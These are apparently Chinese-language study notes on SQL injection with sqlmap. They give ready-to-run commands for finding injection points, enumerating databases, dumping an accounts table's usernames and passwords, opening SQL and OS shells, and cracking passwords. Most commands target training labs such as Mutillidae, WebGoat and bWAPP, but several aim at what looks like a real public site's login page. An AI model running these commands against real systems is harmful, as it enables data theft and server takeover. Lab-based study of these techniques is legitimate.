# SQL

## SQL语法

+ database() 获取数据库名字
+ user()、current_user 获取当前用户名
+ @@version() 貌似不好使
+ 
## SQL注入



## SQL盲注

## sqlmap

SQLMap 是个命令行工具，包含在 Kali 中，可以帮我们自动化检测和利用 SQL 注入，它带有多种技巧，并支持多种数据库。

### GET注入

**检查注入点**

`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details"`

**暴所有数据库的信息**

`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" --dbs`

**爆当前数据库的信息**

`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" --current-db`

**指定库名列出所有表**

`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" -D nowasp --tables `

**指定库名表名列出所有字段**

`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" -D nowasp -T accounts --columns`

**指定库名表名下载出指定字段内容**

`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" -D nowasp -T accounts -C username password mysignature -dump`

### POST注入

#### 自动填写表单

**判断是否有post注入**

`Csqlmap -u http://vip.fj0730.cn/login.asp --forms`

**查找数据库**

`sqlmap -u http://vip.fj0730.cn/login.asp --forms --dbs`

**查找当前数据库**

`sqlmap -u http://vip.fj0730.cn/login.asp --forms --current-db`

查找表名、字段名、爆出数据与GET注入一致

#### sqlmap结合burp

1. 抓包
2. 全选抓的数据包（RAW页面的内容），右键 | 保存到1.txt文件
3. `sqlmap -r '/home/1.txt'`
4. 查找当前数据库 `sqlmap -r '/home/1.txt' --current-db`
5. 剩下的操作与之前的一致

####  指定表单注入

`sqlmap -u http://vip.fj0730.cn/login.asp --data "userid=aaa&passwd=bbbb"`

`sqlmap -u http://vip.fj0730.cn/login.asp --data "userid=aaa&passwd=bbbb" --current-db`

`--data` 用于POST方法，发送到服务器的POST数据

### sqlmap选项

`--batch` 永远不要求用户输入

`--sqlmap-shell` 提示输入的交互式sqlmap shell

`--sql-shell` 提供SQL shell，可以执行SQL查询

`--os-shell` 提供服务器系统cmd的执行权限，成功的条件较为苛刻，暂未研究明白，参见[获取os-shell][https://zhuanlan.zhihu.com/p/58007573]。

`--is-dba` 判断当前用户是否拥有root权限

`--dbms mysql` 指定数据库类型 

`--cookie=""` 指定cookie，用于需要身份认证的情形。用户登录后的SQL注入漏洞必须要指定cookie

`-p`指定注入点

`--skip` GET方法时排除参数

在WebGoat | Injection | blind numberic sql injection中，sqlmap可以完美地解决http情形下的注入问题，对于https情形，sqlmap需要指定代理

`sqlmap -r /root/Documents/KaliCookbook/Ch7_Test/bWAPP_SQL_Injection_Post_search.txt -p title --force-ssl --proxy "http://127.0.0.1:8080"`

`--users --passwords` 查询用户名和密码，sqlmap提供字典爆破，可以爆破口令。